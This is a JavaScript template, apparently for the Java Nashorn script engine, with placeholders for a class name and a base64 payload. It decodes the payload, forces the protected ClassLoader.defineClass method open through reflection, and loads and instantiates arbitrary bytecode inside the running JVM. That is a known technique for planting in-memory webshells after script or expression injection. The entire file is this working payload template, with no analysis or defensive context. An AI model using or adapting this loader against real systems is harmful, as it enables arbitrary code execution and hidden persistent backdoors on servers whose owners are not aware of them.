var classLoader = java.lang.Thread.currentThread().getContextClassLoader();
var className = "{{className}}";
var base64Str = "{{base64Str}}";
try {
    classLoader.loadClass(className).newInstance();
} catch (e) {
    var clsString = classLoader.loadClass("java.lang.String");
    var bytecode;
    try {
        var clsBase64 = classLoader.loadClass("java.util.Base64");
        var clsDecoder = classLoader.loadClass("java.util.Base64$Decoder");
        var decoder = clsBase64.getMethod("getDecoder").invoke(clsDecoder);
        bytecode = clsDecoder.getMethod("decode", clsString).invoke(decoder, base64Str);
    } catch (ee) {
        try {
            var datatypeConverterClz = classLoader.loadClass("javax.xml.bind.DatatypeConverter");
            bytecode = datatypeConverterClz.getMethod("parseBase64Binary", clsString).invoke(datatypeConverterClz, base64Str);
        } catch (eee) {
            var clazz1 = classLoader.loadClass("sun.misc.BASE64Decoder");
            bytecode = clazz1.newInstance().decodeBuffer(base64Str);
        }
    }
    var clsClassLoader = classLoader.loadClass("java.lang.ClassLoader");
    var clsByteArray = (new java.lang.String("a").getBytes().getClass());
    var clsInt = java.lang.Integer.TYPE;
    var defineClass = clsClassLoader.getDeclaredMethod("defineClass", [clsByteArray, clsInt, clsInt]);
    defineClass.setAccessible(true);
    var clazz = defineClass.invoke(classLoader, bytecode, new java.lang.Integer(0), new java.lang.Integer(bytecode.length));
    clazz.newInstance();
}